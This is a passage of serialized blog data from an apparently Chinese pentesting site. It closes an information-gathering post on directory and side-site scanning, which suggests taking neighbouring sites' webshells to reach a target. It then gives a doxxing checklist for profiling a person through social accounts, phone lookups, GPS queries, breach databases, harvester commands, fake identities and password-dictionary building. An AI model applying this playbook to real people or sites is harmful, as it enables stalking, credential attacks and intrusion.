Forbidden：请求有效但服务器拒绝响应&lt;/p&gt;\n&lt;p&gt;基本用法：dirb 网站地址&lt;/p&gt;\n&lt;h1 id=\&quot;旁站和c段扫描\&quot;&gt;旁站和C段扫描&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#旁站和c段扫描\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！&lt;/p&gt;\n&lt;p&gt;对于红蓝对抗和护网，C段扫描比较有意义。对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。&lt;/p&gt;\n&lt;p&gt;旁站和C段在线查询地址：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;\n&lt;div class=\&quot;link-preview-block not-prose\&quot; data-state=\&quot;success\&quot;&gt;\n  &lt;a href=\&quot;http://www.webscan.cc/\&quot; target=\&quot;_blank\&quot; class=\&quot;group block overflow-hidden rounded-lg border border-border transition-all hover:border-primary/50 hover:shadow-md\&quot; aria-label=\&quot;同IP网站查询,C段查询,IP反查域名,在线C段,旁站工具 - WebScan - webscan.cc\&quot;&gt;\n    &lt;div class=\&quot;bg-card flex md:flex-col flex-row\&quot;&gt;\n      &lt;div class=\&quot;flex-1 p-4\&quot;&gt;\n        &lt;div class=\&quot;mb-2 flex items-center gap-2\&quot;&gt;\n          &lt;img src=\&quot;http://www.webscan.cc/favicon.ico\&quot; alt=\&quot;\&quot; class=\&quot;h-4 w-4 shrink-0\&quot; loading=\&quot;lazy\&quot; aria-hidden=\&quot;true\&quot;&gt;\n          &lt;span class=\&quot;text-muted-foreground truncate text-xs font-medium\&quot;&gt;webscan.cc&lt;/span&gt;\n        &lt;/div&gt;\n        &lt;h3 class=\&quot;text-foreground mb-2 line-clamp-2 font-semibold leading-tight\&quot;&gt;同IP网站查询,C段查询,IP反查域名,在线C段,旁站工具 - WebScan&lt;/h3&gt;\n        &lt;p class=\&quot;text-muted-foreground mb-3 line-clamp-2 text-sm\&quot;&gt;该网址工具能查询ip、ip地址、C段、同服务器上运行的其他网站,以及服务器IP上有多少个二级域名或旁站点。&lt;/p&gt;\n        &lt;div class=\&quot;text-primary flex items-center gap-1 text-xs\&quot;&gt;\n          &lt;span class=\&quot;truncate\&quot;&gt;http://www.webscan.cc/&lt;/span&gt;\n          &lt;svg class=\&quot;h-3 w-3 shrink-0 transition-transform group-hover:translate-x-0.5\&quot; aria-hidden=\&quot;true\&quot; viewBox=\&quot;0 0 12 12\&quot;&gt;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M4 3.5a.5.5 0 0 0-.5.5v4a.5.5 0 0 0 .5.5h4a.5.5 0 0 0 .5-.5v-.25a.75.75 0 0 1 1.5 0V8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h.25a.75.75 0 0 1 0 1.5zm2.75 0a.75.75 0 0 1 0-1.5h2.5a.75.75 0 0 1 .75.75v2.5a.75.75 0 0 1-1.5 0v-.69L7.28 5.78a.75.75 0 0 1-1.06-1.06L7.44 3.5z\&quot;&gt;&lt;/path&gt;&lt;/svg&gt; \n        &lt;/div&gt;\n      &lt;/div&gt;\n      \n    &lt;/div&gt;\n  &lt;/a&gt;\n&lt;/div&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;div class=\&quot;link-preview-block not-prose\&quot; data-state=\&quot;error\&quot;&gt;\n  &lt;a href=\&quot;https://phpinfo.me/bing.php\&quot; target=\&quot;_blank\&quot; class=\&quot;hover:border-primary/50 group block rounded-lg border bg-card p-4 transition-all hover:shadow-md\&quot; aria-label=\&quot;https://phpinfo.me/bing.php\&quot;&gt;\n    &lt;div class=\&quot;flex items-center justify-between gap-3\&quot;&gt;\n      &lt;div class=\&quot;flex items-center gap-3 min-w-0 flex-1\&quot;&gt;\n        &lt;div class=\&quot;bg-primary/10 text-primary flex h-10 w-10 shrink-0 items-center justify-center rounded-lg\&quot;&gt;\n          &lt;svg class=\&quot;h-5 w-5\&quot; viewBox=\&quot;0 0 24 24\&quot; aria-hidden=\&quot;true\&quot;&gt;&lt;path fill=\&quot;none\&quot; stroke=\&quot;currentColor\&quot; stroke-dasharray=\&quot;28\&quot; stroke-dashoffset=\&quot;28\&quot; stroke-linecap=\&quot;round\&quot; stroke-linejoin=\&quot;round\&quot; stroke-width=\&quot;2\&quot; d=\&quot;M13 6l2 -2c1 -1 3 -1 4 0l1 1c1 1 1 3 0 4l-5 5c-1 1 -3 1 -4 0M11 18l-2 2c-1 1 -3 1 -4 0l-1 -1c-1 -1 -1 -3 0 -4l5 -5c1 -1 3 -1 4 0\&quot;&gt;&lt;animate fill=\&quot;freeze\&quot; attributeName=\&quot;stroke-dashoffset\&quot; dur=\&quot;0.6s\&quot; values=\&quot;28;0\&quot;&gt;&lt;/animate&gt;&lt;/path&gt;&lt;/svg&gt;\n        &lt;/div&gt;\n        &lt;div class=\&quot;min-w-0 flex-1\&quot;&gt;\n          &lt;div class=\&quot;text-foreground font-medium truncate\&quot;&gt;https://phpinfo.me/bing.php&lt;/div&gt;\n          &lt;div class=\&quot;text-muted-foreground text-xs truncate mt-0.5\&quot;&gt;phpinfo.me&lt;/div&gt;\n        &lt;/div&gt;\n      &lt;/div&gt;\n      &lt;svg class=\&quot;text-primary h-5 w-5 shrink-0 transition-transform group-hover:translate-x-1\&quot; fill=\&quot;none\&quot; stroke=\&quot;currentColor\&quot; viewBox=\&quot;0 0 24 24\&quot;&gt;\n        &lt;path stroke-linecap=\&quot;round\&quot; stroke-linejoin=\&quot;round\&quot; stroke-width=\&quot;2\&quot; d=\&quot;M14 5l7 7m0 0l-7 7m7-7H3\&quot;&gt;&lt;/path&gt;\n      &lt;/svg&gt;\n    &lt;/div&gt;\n  &lt;/a&gt;\n&lt;/div&gt;\n&lt;/li&gt;\n&lt;/ul&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;前言&quot;],&quot;text&quot;:[0,&quot;前言&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;在线搜索shodan&quot;],&quot;text&quot;:[0,&quot;在线搜索（Shodan）&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;shodan工作原理&quot;],&quot;text&quot;:[0,&quot;Shodan工作原理&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;shodan的使用&quot;],&quot;text&quot;:[0,&quot;Shodan的使用&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;使用搜索过滤&quot;],&quot;text&quot;:[0,&quot;使用搜索过滤&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;kali中安装-shodan&quot;],&quot;text&quot;:[0,&quot;Kali中安装 Shodan&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;kali中shodan的使用&quot;],&quot;text&quot;:[0,&quot;Kali中Shodan的使用&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;msf中使用shodan&quot;],&quot;text&quot;:[0,&quot;MSF中使用Shodan&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;域名信息收集&quot;],&quot;text&quot;:[0,&quot;域名信息收集&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;通过域名查询ip&quot;],&quot;text&quot;:[0,&quot;通过域名查询IP&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;查询网站&quot;],&quot;text&quot;:[0,&quot;查询网站&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;什么是cdn&quot;],&quot;text&quot;:[0,&quot;什么是CDN&quot;]}],[0,{&quot;depth&quot;:[0,4],&quot;slug&quot;:[0,&quot;2113-cdn的优势&quot;],&quot;text&quot;:[0,&quot;2.1.1.3 CDN的优势&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;几种访问方式的不同&quot;],&quot;text&quot;:[0,&quot;几种访问方式的不同&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;cdn的配置&quot;],&quot;text&quot;:[0,&quot;CDN的配置&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;绕过cdn的方法&quot;],&quot;text&quot;:[0,&quot;绕过CDN的方法&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;查询子域名&quot;],&quot;text&quot;:[0,&quot;查询子域名&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;查询主域名&quot;],&quot;text&quot;:[0,&quot;查询主域名&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;邮件服务器&quot;],&quot;text&quot;:[0,&quot;邮件服务器&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;查看域名历史解析记录&quot;],&quot;text&quot;:[0,&quot;查看域名历史解析记录&quot;]}],[0,{&quot;depth&quot;:[0,4],&quot;slug&quot;:[0,&quot;国外访问&quot;],&quot;text&quot;:[0,&quot;国外访问&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;nslookup查询&quot;],&quot;text&quot;:[0,&quot;Nslookup查询&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;网站漏洞&quot;],&quot;text&quot;:[0,&quot;网站漏洞&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;censys查询ssl证书找到真实ip&quot;],&quot;text&quot;:[0,&quot;Censys查询SSL证书找到真实IP&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;域名的whois信息&quot;],&quot;text&quot;:[0,&quot;域名的whois信息&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;公司敏感信息收集&quot;],&quot;text&quot;:[0,&quot;公司敏感信息收集&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;github的搜索&quot;],&quot;text&quot;:[0,&quot;Github的搜索&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;使用-github-进行邮件配置信息收集&quot;],&quot;text&quot;:[0,&quot;使用 Github 进行邮件配置信息收集&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;使用github进行数据库信息收集&quot;],&quot;text&quot;:[0,&quot;使用Github进行数据库信息收集&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;使用github进行-svn-信息收集&quot;],&quot;text&quot;:[0,&quot;使用Github进行 SVN 信息收集&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;使用github进行综合信息收集&quot;],&quot;text&quot;:[0,&quot;使用Github进行综合信息收集&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;网站指纹识别&quot;],&quot;text&quot;:[0,&quot;网站指纹识别&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;整站分析&quot;],&quot;text&quot;:[0,&quot;整站分析&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;服务器类型linuxwindows&quot;],&quot;text&quot;:[0,&quot;服务器类型（Linux/windows）&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;网站容器apachenginxtomcatiis&quot;],&quot;text&quot;:[0,&quot;网站容器（Apache/Nginx/Tomcat/IIS）&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;脚本类型phpjspaspaspx&quot;],&quot;text&quot;:[0,&quot;脚本类型（php/jsp/asp/aspx）&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;数据库类型mysqloracleaccesssqlserver&quot;],&quot;text&quot;:[0,&quot;数据库类型（Mysql/Oracle/Access/SQLserver）&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;第六章主机扫描&quot;],&quot;text&quot;:[0,&quot;第六章主机扫描&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;第七章端口扫描nmap&quot;],&quot;text&quot;:[0,&quot;第七章端口扫描（nmap）&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;nmap简介&quot;],&quot;text&quot;:[0,&quot;nmap简介&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;nmap基本功能&quot;],&quot;text&quot;:[0,&quot;nmap基本功能&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;探测目标主机是否在线&quot;],&quot;text&quot;:[0,&quot;探测目标主机是否在线&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;当探测公网ip时&quot;],&quot;text&quot;:[0,&quot;当探测公网IP时&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;当探测内网ip时&quot;],&quot;text&quot;:[0,&quot;当探测内网IP时&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;722-端口扫描及原理&quot;],&quot;text&quot;:[0,&quot;7.2.2 端口扫描及原理&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;原理&quot;],&quot;text&quot;:[0,&quot;原理&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;简单扫描nmap-ip&quot;],&quot;text&quot;:[0,&quot;简单扫描（nmap ip）&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;全面扫描nmap--a-ip&quot;],&quot;text&quot;:[0,&quot;全面扫描(nmap -A ip)&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;探测指定端口的开放状态&quot;],&quot;text&quot;:[0,&quot;探测指定端口的开放状态&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;723-版本侦测&quot;],&quot;text&quot;:[0,&quot;7.2.3 版本侦测&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;原理-1&quot;],&quot;text&quot;:[0,&quot;原理&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;用法&quot;],&quot;text&quot;:[0,&quot;用法&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;724-os侦测&quot;],&quot;text&quot;:[0,&quot;7.2.4 OS侦测&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;原理-2&quot;],&quot;text&quot;:[0,&quot;原理&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;用法-1&quot;],&quot;text&quot;:[0,&quot;用法&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;73-nmap高级功能&quot;],&quot;text&quot;:[0,&quot;7.3 nmap高级功能&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;731-防火墙ids规避&quot;],&quot;text&quot;:[0,&quot;7.3.1 防火墙/IDS规避&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;nse脚本引擎&quot;],&quot;text&quot;:[0,&quot;NSE脚本引擎&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;分类扫描&quot;],&quot;text&quot;:[0,&quot;分类扫描&quot;]}],[0,{&quot;depth&quot;:[0,5],&quot;slug&quot;:[0,&quot;应用扫描&quot;],&quot;text&quot;:[0,&quot;应用扫描&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;常见危险端口对应的服务&quot;],&quot;text&quot;:[0,&quot;常见危险端口对应的服务&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;网站敏感目录和文件&quot;],&quot;text&quot;:[0,&quot;网站敏感目录和文件&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;dirbuster&quot;],&quot;text&quot;:[0,&quot;dirbuster&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;旁站和c段扫描&quot;],&quot;text&quot;:[0,&quot;旁站和C段扫描&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/1.png&quot;],[0,&quot;img/2.png&quot;],[0,&quot;img/3.png&quot;],[0,&quot;img/4.png&quot;],[0,&quot;img/5.png&quot;],[0,&quot;img/6.png&quot;],[0,&quot;img/7.png&quot;],[0,&quot;img/8.png&quot;],[0,&quot;img/9.png&quot;],[0,&quot;img/10.png&quot;],[0,&quot;img/11.png&quot;],[0,&quot;img/12.png&quot;],[0,&quot;img/13.png&quot;],[0,&quot;img/14.png&quot;],[0,&quot;img/16.png&quot;],[0,&quot;img/15.png&quot;],[0,&quot;img/17.png&quot;],[0,&quot;img/18.png&quot;],[0,&quot;img/19.png&quot;],[0,&quot;img/20.png&quot;],[0,&quot;img/21.png&quot;],[0,&quot;img/22.jpg&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;信息收集&quot;],&quot;date&quot;:[3,&quot;2023-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/1.png&quot;],[0,&quot;img/2.png&quot;],[0,&quot;img/3.png&quot;],[0,&quot;img/4.png&quot;],[0,&quot;img/5.png&quot;],[0,&quot;img/6.png&quot;],[0,&quot;img/7.png&quot;],[0,&quot;img/8.png&quot;],[0,&quot;img/9.png&quot;],[0,&quot;img/10.png&quot;],[0,&quot;img/11.png&quot;],[0,&quot;img/12.png&quot;],[0,&quot;img/13.png&quot;],[0,&quot;img/14.png&quot;],[0,&quot;img/16.png&quot;],[0,&quot;img/15.png&quot;],[0,&quot;img/17.png&quot;],[0,&quot;img/18.png&quot;],[0,&quot;img/19.png&quot;],[0,&quot;img/20.png&quot;],[0,&quot;img/21.png&quot;],[0,&quot;img/22.jpg&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/6&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/人网搜索&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;人肉搜索&quot;],&quot;date&quot;:[3,&quot;2022-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# 人肉搜索\n\n**社交**\n\n```\nQQ、weibo、支付宝、脉脉、领英、咸鱼、短视频、人人、贴吧、论坛\n外网信息\n有些人喜欢把自己的生活传到外网\n推特、ins、fb等\n微信号\n某些人昵称包含姓名缩写，生日等。\n全网用同一个网名、头像\n手机号查询注册过的网站 https://www.reg007.com/\n从好友入手，找到目标亲密的人\n手机添加到手机通讯录，登录一些APP时会提醒你关注\n```\n手机号加入通讯录匹配各个APP用户信息\n\n注册过的网站\n```\nhttps://www.reg007.com/\nhttps://www.usersearch.org/\n```\n\n目标人员的兴趣\n\n```\n目标人员的兴趣 注册过的小众论坛，站点\n针对此类站点的深入\n收集到的用户名，电话等信息生成字典\n```\n\n邮箱搜集与验证\n\n```\nChrome插件 查找网页暴露邮箱 https://hunter.io/chrome\nhttps://souyouxiang.com/find-contact/ 邮箱域名搜索\nhttps://github.com/killswitch-GUI/SimplyEmail\nhttps://tools.verifyemailaddress.io/\nhttps://github.com/maldevel/EmailHarvester \n  python3 EmailHarvester.py -d google.com -e all \nhttps://github.com/m4ll0k/infoga \n  python3 infoga.py --domain vmware.com --source all \nhttps://www.skymem.info/ 邮箱地址搜索\n```\n\nExchange\n\n```\nhttps://github.com/dafthack/MailSniper\n```\n\n历史泄露过的资料等\n\n```\n库\nhttps://intelx.io/ \nhttps://weleakinfo.to/ \nhttps://haveibeenpwned.com/\nhttps://github.com/kernelmachine/haveibeenpwned\nhttps://www.dehashed.com/ \n  python3 dehashed.py -o -d domain.com -a API-KEY -u user@domain.com\n```\n\nGPS查询\n\n```\nhttps://www.opengps.cn/Default.aspx\n```\n\n默认密码\n\n```\nhttps://default-password.info/\nhttp://routerpasswords.com\n```\n\n如需注册\n\n```\nSms\nhttps://www.materialtools.com/\nhttp://receivefreesms.com/\nEmail\nhttps://10minutemail.net/\nhttps://zh.mytrashmailer.com/\nhttp://24mail.chacuo.net/enus\nhttps://www.linshiyouxiang.net/\nFake id\nhttps://www.fakenamegenerator.com/\nhttp://www.haoweichi.com/\nhttps://www.fakeaddressgenerator.com/\n```\n\n\n企业信息\n\n```\n天眼查、企查查、企业信用信息公示系统\n企业邮箱收集，企业架构画像、人员统计、人员职责、部门、WiFi、常用部门密码、人员是否泄露过密码、人员平时爱逛的站点、OA/erp/crm/sso/mail/vpn等入口、网络安全设备（waf,ips,ids,router等统计）、内部使用的代码托管平台(gitlab、daocloud等)，bug管理平台、服务器域名资产统计\n员工姓名\n从LinkedIn中提取所有员工\nhttps://github.com/ChrisAD/linkedin-employee-scraper\n```&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/人网搜索.md&quot;],&quot;digest&quot;:[0,&quot;477f900264dd6af9&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;人肉搜索\&quot;&gt;人肉搜索&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#人肉搜索\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;strong&gt;社交&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;QQ、weibo、支付宝、脉脉、领英、咸鱼、短视频、人人、贴吧、论坛&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;外网信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;有些人喜欢把自己的生活传到外网&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;推特、ins、fb等&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;微信号&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;某些人昵称包含姓名缩写，生日等。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;全网用同一个网名、头像&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;手机号查询注册过的网站 https://www.reg007.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;从好友入手，找到目标亲密的人&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;手机添加到手机通讯录，登录一些APP时会提醒你关注&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;手机号加入通讯录匹配各个APP用户信息&lt;/p&gt;\n&lt;p&gt;注册过的网站&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.reg007.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.usersearch.org/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;目标人员的兴趣&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;目标人员的兴趣 注册过的小众论坛，站点&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;针对此类站点的深入&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;收集到的用户名，电话等信息生成字典&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;邮箱搜集与验证&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Chrome插件 查找网页暴露邮箱 https://hunter.io/chrome&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://souyouxiang.com/find-contact/ 邮箱域名搜索&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/killswitch-GUI/SimplyEmail&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://tools.verifyemailaddress.io/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/maldevel/EmailHarvester &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  python3 EmailHarvester.py -d google.com -e all &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/m4ll0k/infoga &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  python3 infoga.py --domain vmware.com --source all &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.skymem.info/ 邮箱地址搜索&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Exchange&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/dafthack/MailSniper&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;历史泄露过的资料等&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;库&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://intelx.io/ &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://weleakinfo.to/ &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://haveibeenpwned.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/kernelmachine/haveibeenpwned&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.dehashed.com/ &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  python3 dehashed.py -o -d domain.com -a API-KEY -u user@domain.com&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;GPS查询&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; 